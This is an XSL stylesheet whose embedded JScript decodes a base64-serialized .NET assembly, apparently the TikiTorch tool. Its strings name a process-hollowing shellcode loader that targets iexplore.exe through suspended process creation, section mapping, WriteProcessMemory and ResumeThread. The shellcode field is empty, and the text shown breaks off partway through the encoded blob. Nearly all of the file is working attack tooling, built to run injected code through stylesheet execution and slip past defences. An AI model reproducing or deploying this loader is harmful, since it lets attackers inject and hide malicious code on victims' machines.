<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[


var targetProcess = "C:\\Program Files\\Internet Explorer\\iexplore.exe";
var encodedShellcode = "";

function setversion() {
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAACwAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIA1RRgggAAAAAA"+
"AAAA8AAiIAsCMAAAJgAAAAQAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAYA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBghQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAHgDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACERAAA"+
"OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAADSUAAAAgAAAAJgAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAHgDAAAAYAAAAAQAAAAoAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUArCgAANgbAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGoCKBIAAAoAAAJyAQAAcHIZ"+
"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"+
"AAEAtgCHAAEArACHAAEAAgGHAAEA8gAoAgEAxwAoAgEA6wArAlGAgAQvAlGAjgQyAgYAzQiHAAYA"+
"fwGHAAYAQgEvAgYANwEvAgYAAQCHAAYAJQmHAAYAKwCHAAYANQCHAAYAvwGHAAYApwGHAAEACgEo"+
"AgEAtAGHAAEA5QaHAAEAOAKHAAEApAAoAgEAqAAoAgEAXAQoAgEAZAQoAgEAXggoAgEAbAgoAgEA"+
"EggoAgEAOggoAgEAQgo1AgEAnAE1AgEAKQCHAAEAHAqHAAEAJgqHAAEAVweHAAYAngUoAgYAdQQo"+
"AgYASAmHAAYAWAmHAAYAJAWHAAYAqQcoAgYAcAIoAgYAsAooAgYAVgU1AgYAywU1AgYA+wkoAgYA"+
"8gkvAkggAAAAAIYYUQcGAAEAZCAAAAAAhgBSAjgCAQAAAAAAgACRIAoGPgIDAAAAAACAAJEgGgZM"+
"AgoAAAAAAIAAkSCpBlwCFAAAAAAAgACRIP4IYwIVAAAAAACAAJEgFwJDARUAAAAAAIAAkSAtBmcC"+
"FgAAAAAAgACRIL8IbQIYAAAAAACAAJEgTgp/AiIAAAAAAIAAkSByAYkCJwAAAAAAgACRINYIjgIo"+
"AAAAAACAAJEgZwqaAi0AAAAAAIAAkSB5CqUCMgAAAAAAgACRIEQHrwI3ALggAAAAAIYA8gGzAjcA"+
"7CAAAAAAgQCkCLgCOAAIIQAAAACGANkJvQI5ACAhAAAAAIYAWwbBAjkAmCEAAAAAhgAMBs0CPAD8"+
"IQAAAACGAEsG0gI9AFwiAAAAAIYA2gHXAj4AtCIAAAAAhgAQCd0CPwAcIwAAAACGAA8F4wJAAPQj"+
"AAAAAIEABAftAkEAnCQAAAAAhgCMCvMCQgDoJQAAAACGAAMK+AJDAHAnAAAAAIYAIAe9AkQAiCcA"+
"AAAAxADCBAYARADYJwAAAACGAIcB/gJEAEgoAAAAAIYYUQcGAEYAAAABAPAIAAACAMkBAAABAHgG"+
"AAACAJYIAAADAHoIAAAEALkEAAAFAOQJAAAGAIQHAAAHACoCAAABAHgGAAACAB0JAAADAO8GAAAE"+
"AHAJAAAFAJ4EAAAGANAEAAAHALAEAAAIANMGAAAJAIUCAAAKAO0JAAABAL0GAAABACMCAAABAEIG"+
"AAACAGgJAAABAEACAAACAFgCAAADAGYHAAAEAHQHAAAFAAIIAAAGACwIAAAHAMsJAAAIADcHAQAJ"+
"AMcGAgAKANkFAAABAM0IAAACAD4JAAADAKkEAAAEAJYJAgAFAIcJAAABAH8BAAABAM0IAAACAIEI"+
"AAADAOsFAAAEAKsFAAAFALcFAAABAM0IAAACADAJAgADABcHAAAEAKkEAgAFAF4BAAABAM0IAAAC"+
"ADAJAAADABcHAAAEAJgEAgAFAL4FAAABAMsEAAABADEKAAABAAwCAAACAKMJAAADAPgGAAABAMsE"+
"AAABAMsEAAABANYEAAABAB8FAAABABcKAAABANYEAAABADEBAAABALcGAAABAPAIAAACAOgBCQBR"+
"BwEAEQBRBwYAGQBRBwoAKQBRBxAAMQBRBxAAOQBRBxAAQQBRBxAASQBRBxAAUQBRBxAAWQBRBxAA"+
"YQBRBxUAaQBRBxAAcQBRBxAAeQBRBxAAiQBRBxoAkQBRBwYAmQDCBAYAmQBRBwYAuQD0BCcAoQAA"+
"Ai0AwQB5CTEAyQBmAjcA0QCrCVcA0QCrCVwAwQB5CWEA4QBRBxAADABRB24A0QDgBocADABfCooA"+
"0QCWCo8ADABSBJUA6QBRBxAA0QCrCaMA8QA1BcgA0QBsBM0A0QCrCdEA+QAjCNYA0QCrCdwA+QAj"+
"COEAFABRB24A0QASAAIB0QA/AAYB+QASABsB+QA/ACIBFABfCooAFABSBJUA0QCiCo8A8QBCBUMB"+
"CQAEAFcBCQAIAFwBCQAMAGEBCQAQAGYBCQAUAGsBCQAYAHABCQAcAFwBCQAgAHUBCQAkAGsBCABQ"+
"AHoBCwBUAH8BJwCDAOoDLgALAAUDLgATAA4DLgAbAC0DLgAjADYDLgArAEUDLgAzAEUDLgA7AEUD"+
"LgBDADYDLgBLAEsDLgBTAEUDLgBbAEUDLgBjAGMDLgBrAI0DLgBzAJoDQwBbAOQDCAAGAIgBAQAA"+
"AAAACAAgADwAQgBGAEoAdgB9AJoAqQC0AO4ACgEpAUgBAwA6ACMAlAVsBXkFZwDnAAADBwAKBgEA"+
"AAMJABoGAQAAAwsAqQYCAAADDQD+CAIAAAMPABcCAgAAAxEALQYBAEYDEwC/CAIAAAEVAE4KAwBA"+
"ARcAcgEDAAADGQDWCAEAQAEbAGcKAwBAAx0AeQoDAAABHwBEBwMABIAAAAEAAAAAAAAAAAAAAAAA"+
"BQUAAAQAAAAAAAAAAAAAAE4BDQEAAAAABAADAAUAAwAGAAMABwADAAgAAwAAAAAAAFJlc2VydmVk"+
"MQBVSW50MzIAVG9JbnQzMgBLZXlWYWx1ZVBhaXJgMgBscFJlc2VydmVkMgBSZXNlcnZlZDMAVG9J"+
"bnQ2NAA8TW9kdWxlPgBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OAFBST0NFU1NfSU5GT1JNQVRJ"+
"T04AU1RBUlRVUElORk8AU1lTVEVNX0lORk8ATEFSR0VfSU5URUdFUgBkd1gAZHdZAHBNb2RCYXNl"+
"XwByZW1vdGVzaXplXwBsb2NhbHNpemVfAHNlY3Rpb25fAHJlbW90ZW1hcF8AbG9jYWxtYXBfAGlu"+
"bmVyXwBydmFFbnRyeU9mZnNldF8AcEVudHJ5XwBjYgBtc2NvcmxpYgBTeXN0ZW0uQ29sbGVjdGlv"+
"bnMuR2VuZXJpYwBoUHJvYwBkd1RocmVhZElkAGR3UHJvY2Vzc0lkAFBhZ2VFeGVjdXRlUmVhZABs"+
"cE51bWJlck9mQnl0ZXNSZWFkAFJlc3VtZVRocmVhZABoVGhyZWFkAExvYWQAQ3JlYXRlU3VzcGVu"+
"ZGVkAGNiUmVzZXJ2ZWQATW9yZVJlc2VydmVkAGxwUmVzZXJ2ZWQAVW5pcXVlUGlkAGVuY29kZWRT"+
"aGVsbGNvZGUAQ29weVNoZWxsY29kZQBzaGVsbGNvZGUAcm91bmRfdG9fcGFnZQBnZXRfTWVzc2Fn"+
"ZQBwcm9jSGFuZGxlAENsb3NlSGFuZGxlAGhhbmRsZQBoRmlsZQBDb25zb2xlAGxwVGl0bGUAbHBB"+
"cHBsaWNhdGlvbk5hbWUARmxhbWUAbHBDb21tYW5kTGluZQBXcml0ZUxpbmUAZHdQcm9jVHlwZQBW"+
"YWx1ZVR5cGUAYWxsb2N0eXBlAFBhZ2VSZWFkV3JpdGUAR3VpZEF0dHJpYnV0ZQBVbnZlcmlmaWFi"+
"bGVDb2RlQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBB"+
"c3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZy"+
"YW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAFNlY3VyaXR5UGVy"+
"bWlzc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlE"+
"ZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2Vt"+
"Ymx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNv"+
"bXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAUGFnZVJlYWRXcml0"+
"ZUV4ZWN1dGUAQnl0ZQBnZXRfVmFsdWUAZHdYU2l6ZQBkd1lTaXplAGdldF9TaXplAGR3UGFnZVNp"+
"emUAQXR0cmlidXRlU2l6ZQBQYXRjaFNpemUAblNpemUAY29tbWl0U2l6ZQBkd1NpemUAdmlld1Np"+
"emUAcE1heFNpemUARmluYWxpemUAc2l6ZQBzdHVmZgBidWYAU3lzdGVtLlJ1bnRpbWUuVmVyc2lv"+
"bmluZwBGcm9tQmFzZTY0U3RyaW5nAFRpa2lUb3JjaABCdWlsZEVudHJ5UGF0Y2gAcGF0aABkd0Fj"+
"dGl2ZVByb2NNYXNrAEFsbG9jSEdsb2JhbABGcmVlSEdsb2JhbABNYXJzaGFsAHdQcm9jTGV2ZWwA"+
"R2VuZXJpY0FsbABLZXJuZWwzMi5kbGwAa2VybmVsMzIuZGxsAFRpa2lUb3JjaC5kbGwAbnRkbGwu"+
"ZGxsAGR3T2VtAFN5c3RlbQBQcm9jSW5mb0xlbgByZXRsZW4AbHBOdW1Xcml0dGVuAHdQcm9jUmV2"+
"aXNpb24AbHBQcm9jSW5mb3JtYXRpb24AcHJvY0luZm9ybWF0aW9uAFNlY3VyaXR5QWN0aW9uAFp3"+
"Q3JlYXRlU2VjdGlvbgBad01hcFZpZXdPZlNlY3Rpb24AWndVbm1hcFZpZXdPZlNlY3Rpb24AaFNl"+
"Y3Rpb24AU2V0TG9jYWxTZWN0aW9uAE1hcFNlY3Rpb24AU3lzdGVtLlJlZmxlY3Rpb24Ac2VjdGlv"+
"bgBJbmRleE91dE9mUmFuZ2VFeGNlcHRpb24AU3lzdGVtRXhjZXB0aW9uAEdldFN5c3RlbUluZm8A"+
"cEluZm8AbHBTeXNJbmZvAGxwU3RhcnRpbmZvAGluaGVyaXREaXNwbwBaZXJvAGxwRGVza3RvcABi"+
"YXNlQWRkcgBhZGRyAExvYWRlcgBHZXRFbnRyeUZyb21CdWZmZXIAbHBCdWZmZXIAR2V0QnVmZmVy"+
"AEJpdENvbnZlcnRlcgBscEN1cnJlbnREaXIAR2V0TGFzdEVycm9yAC5jdG9yAGhTdGRFcnIASW50"+
"UHRyAGxwUHJvY0F0dHJpYnMAbHBUaHJlYWRBdHRyaWJzAGFsbG9jYXRpb25BdHRyaWJzAFN5c3Rl"+
"bS5EaWFnbm9zdGljcwBkd051bVByb2NzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBT"+
"eXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGJJbmhlcml0SGFu"+
"ZGxlcwBkd0ZpbGxBdHRyaWJ1dGVzAEdldEJ5dGVzAGR3Q3JlYXRlRmxhZ3MAZHdGbGFncwBTeXN0"+
"ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMAZHdYQ291bnRDaGFycwBkd1lDb3VudENoYXJzAHBBdHRy"+
"cwBwcm9jSW5mb3JtYXRpb25DbGFzcwBkZXNpcmVkQWNjZXNzAG50X3N1Y2Nlc3MARGV0YWNoZWRQ"+
"cm9jZXNzAENyZWF0ZVByb2Nlc3MAaFByb2Nlc3MAWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcwB0"+
"YXJnZXRQcm9jZXNzAEdldEN1cnJlbnRQcm9jZXNzAFN0YXJ0UHJvY2VzcwBwcm9jZXNzAFBlYkFk"+
"ZHJlc3MAbHBCYXNlQWRkcmVzcwBscEFkZHJlc3MAbHBNaW5BcHBBZGRyZXNzAGxwTWF4QXBwQWRk"+
"cmVzcwBhZGRyZXNzAHplcm9CaXRzAENvbmNhdABPYmplY3QAbHBmbE9sZFByb3RlY3QAZmxOZXdQ"+
"cm90ZWN0AHByb3RlY3QAb3BfRXhwbGljaXQAU2VjQ29tbWl0AE1lbUNvbW1pdABscEVudmlyb25t"+
"ZW50AEdldEN1cnJlbnQAcGFnZVByb3QAcHJvdABIaWdoUGFydABMb3dQYXJ0AE1hcEFuZFN0YXJ0"+
"AENvbnZlcnQAZGVzdABoU3RkSW5wdXQAaFN0ZE91dHB1dAB2AENyZWF0ZU5vV2luZG93AHdTaG93"+
"V2luZG93AFZpcnR1YWxQcm90ZWN0RXgAZ2V0X0tleQBSZWFkUHJvY2Vzc01lbW9yeQBXcml0ZVBy"+
"b2Nlc3NNZW1vcnkARmluZEVudHJ5AG9wX0VxdWFsaXR5AG9wX0luZXF1YWxpdHkAZHdBbGxvY0dy"+
"YW51bGFyaXR5AFN5c3RlbS5TZWN1cml0eQAAABduAG8AdABlAHAAYQBkAC4AZQB4AGUAACFaAEEA"+
"QgAxAEEARwAwAEEAYgBRAEIANQBBAEEAPQA9AAA1WwB4AF0AIABTAG8AbQBlAHQAaABpAG4AZwAg"+
"AHcAZQBuAHQAIAB3AHIAbwBuAGcAIQAhAAA1WwB4AF0AIABTAG8AbQBlAHQAaABpAG4AZwAgAHcA"+
"ZQBuAHQAIAB3AHIAbwBuAGcAIQAgAABFWwB4AF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAG0AYQBw"+
"ACAAdgBpAGUAdwAgAG8AZgAgAHMAZQBjAHQAaQBvAG4AIQAAQ1sAeABdACAAUwBoAGUAbABsAGMA"+
"bwBkAGUAIABiAHUAZgBmAGUAcgAgAGkAcwAgAHQAbwBvACAAbABvAG4AZwAhAAA7WwB4AF0AIABG"+
"AGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAcAByAG8AYwBlAHMAcwAhAABNWwB4AF0A"+
"IABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAbgBmAG8AcgBt"+
"AGEAdABpAG8AbgAhAABFWwB4AF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHIAZQBhAGQAIABwAHIA"+
"bwBjAGUAcwBzACAAbQBlAG0AbwByAHkAIQAAQVsAeABdACAARgBhAGkAbABlAGQAIAB0AG8AIABy"+
"AGUAYQBkACAAbQBvAGQAdQBsAGUAIABzAHQAYQByAHQAIQAAXVsAeABdACAARgBhAGkAbABlAGQA"+
"IAB0AG8AIABtAGEAcAAgAHMAZQBjAHQAaQBvAG4AIABpAG4AdABvACAAdABhAHIAZwBlAHQAIABw"+
"AHIAbwBjAGUAcwBzACEAAFtbAHgAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAdwByAGkAdABlACAA"+
"cABhAHQAYwBoACAAdABvACAAcwB0AGEAcgB0ACAAbABvAGMAYQB0AGkAbwBuACEAIAAAD0YAYQBp"+
"AGwAZQBkACEAADtbAHgAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAcgBlAHMAdABhAHIAdAAgAHQA"+
"aAByAGUAYQBkACEAAENbAHgAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAYwByAGUAYQB0AGUAIABu"+
"AGUAdwAgAHMAZQBjAHQAaQBvAG4AIQAAAAAAj4Ta0Q0iF0aY0C4FJZs0dwAEIAEBCAMgAAEFIAEB"+
"EREEIAEBDgQgAQECBSABARFBBgcCEgwSUQUAAR0FDgMgAA4FAAIODg4EAAEBDgUHAhEcCQMHAQID"+
"BwEYDAcFGBgIAhURVQIYGAQAARgKBAABGAgFAAIOHBwGFRFVAhgYByACARMAEwEGBwMRIAgCCQcC"+
"FRFVAhgYAgIGGAQgABMABQACAhgYBCAAEwEIBwUJAg8FCAIFAAEPARgKBwURGBEQCQIREBMHCggY"+
"DwUdBQIICggCFRFVAggYBAABGBgDAAAIBAABCBgFAAEdBQgEAAEKGAUAAR0FCgYVEVUCCBgTBwsY"+
"DwVFHQUJDwUPBQcPBQgCGAMgAAgDIAAKEAcMERQJCBgdBRgCAgICAhgGAAIIHQUIBgACCh0FCBkH"+
"DBURVQIYGBURVQIIGB0FGAkCGBgCAgICBAABARgFBwIREAIIt3pcVhk04IkEQAAAAAQEAAAABCAA"+
"AAAEABAAAAQAAAAIBAAAABAECAAAAAQYAAAACBAAAAAAAAAAgJ4uAYCEU3lzdGVtLlNlY3VyaXR5"+
"LlBlcm1pc3Npb25zLlNlY3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNp"+
"b249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRl"+
"MDg5FQFUAhBTa2lwVmVyaWZpY2F0aW9uAQIGCQMGHQUCBggCBgsCBgcFIAIBDg4NAAcIEBgJGBAR"+
"IAkJGA8ACggYGBAYGBgYEBgICQkGAAEBEBEcAwAAGAUAAggYGBEACgIYDhgYAgkYGBARGBAREAkA"+
"BQIYGBgJEAkEAAEJGAsABQgYCBARFAkQCQoABQIYGB0FCBAYCQAFAhgYGBgQGAMAAAkEIAEJCQQg"+
"AQIKAyAAGAsgAxURVQIYGBgJGAQgAQIJBCABAQkFIAEBHQUFIAEREA4JIAEVEVUCCBgYBSABGB0F"+
